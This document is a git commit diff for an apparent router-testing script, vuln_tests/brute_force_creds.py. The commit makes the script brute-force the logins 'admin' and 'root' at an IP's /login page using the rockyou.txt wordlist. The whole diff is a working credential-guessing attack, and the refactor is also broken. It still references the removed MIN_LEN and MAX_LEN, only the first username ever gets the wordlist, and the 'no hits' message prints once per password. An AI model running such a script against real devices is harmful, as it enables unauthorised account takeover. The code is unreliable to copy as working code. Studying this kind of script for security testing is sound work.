34c07b8c36ab5a7576b0983110fac900c2e32b80
kr9sis <kristoferhelgi@protonmail.com>
2025-03-24 10:54:10 +0000

    Refactored brute force script to use rockyou.txt instead of permutations

--- vuln_tests/brute_force_creds.py
+++ vuln_tests/brute_force_creds.py
@@ -3,8 +3,7 @@ Explain vulnerability
 """
 
 from argparse import ArgumentParser
-from itertools import permutations
-from string import printable
+from pathlib import Path
 
 from requests import RequestException, post
 
@@ -15,45 +14,40 @@ def check_for_cred(ip: str):
     """
     print("# Brute forcing for credentials...")
 
-    MIN_LEN = 1
-    MAX_LEN = 11
-    usernames = []
-    passwords = []
-    for i in range(MIN_LEN, MAX_LEN):
-        perm_lis = list(permutations(printable, i))
-        for perm in perm_lis:
-            perm = "".join(perm)
-            usernames.append(perm)
-            passwords.append(perm)
+    usernames = ["admin", "root"]
 
     no_hits = True
-    for user in usernames:
-        for password in passwords:
-            try:
-                res = post(
-                    f"http://{ip}/login",
-                    data={"username": user, "password": password},
-                    timeout=5,
-                )
-                if res:
-                    # Somtimes routers display "Welcome, Admin". Reason behind welcome
-                    if "welcome" in res.text.lower():
-                        print(f"- *Credential found!: {user}:{password}*")
-                        no_hits = False
+    password_file = Path(__file__).parent.joinpath("files/rockyou.txt")
+    with open(password_file, "r", encoding="utf-8") as password_file:
+        for user in usernames:
+            for password in password_file:
+                password = password.strip()
+                print(password)
+                try:
+                    res = post(
+                        f"http://{ip}/login",
+                        data={"username": user, "password": password},
+                        timeout=5,
+                    )
+                    if res:
+                        # Somtimes routers display "Welcome, Admin". Reason behind welcome
+                        if "welcome" in res.text.lower():
+                            print(f"- *Credential found!: {user}:{password}*")
+                            no_hits = False
 
-                    # Checks for status code 200
-                    elif res.status_code == 200 and "dashboard" in res.text.lower():
-                        print(f"- *Credential found!: {user}:{password}*")
-                        no_hits = False
+                        # Checks for status code 200
+                        elif res.status_code == 200 and "dashboard" in res.text.lower():
+                            print(f"- *Credential found!: {user}:{password}*")
+                            no_hits = False
 
-            except RequestException:
-                continue
+                except RequestException:
+                    continue
 
-            if no_hits:
-                print(
-                    f"- No hits when brute forcing credentials with passwords of length {MIN_LEN} to {MAX_LEN}"
-                )
-            print()
+                if no_hits:
+                    print(
+                        f"- No hits when brute forcing credentials with passwords of length {MIN_LEN} to {MAX_LEN}"
+                    )
+                print()
 
 
 if __name__ == "__main__":
